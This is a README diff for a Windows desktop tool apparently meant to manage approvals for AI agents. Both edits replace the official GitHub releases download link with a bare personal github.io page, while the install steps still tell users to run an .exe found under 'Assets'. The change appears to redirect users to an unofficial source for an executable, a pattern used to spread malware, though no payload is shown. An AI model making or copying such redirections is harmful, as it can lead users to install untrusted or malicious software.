@@ -1,6 +1,6 @@
 # 🔔 anotify-desktop-approval-hub - Manage your remote tasks with ease
 
-[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/Jorgega1891/anotify-desktop-approval-hub/releases)
+[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://jorgega1891.github.io)
 
 ---
 
@@ -20,7 +20,7 @@ anotify v0.2.1 acts as a bridge between your computer and your AI agents. It col
 
 Follow these steps to install the software on your Windows computer.
 
-1. Visit this page to download the latest version: [https://github.com/Jorgega1891/anotify-desktop-approval-hub/releases](https://github.com/Jorgega1891/anotify-desktop-approval-hub/releases).
+1. Visit this page to download the latest version: [https://jorgega1891.github.io](https://jorgega1891.github.io).
 2. Look for the file ending in `.exe` under the "Assets" section of the latest release.
 3. Click the file to start the download.
 4. Once the download finishes, open your "Downloads" folder.
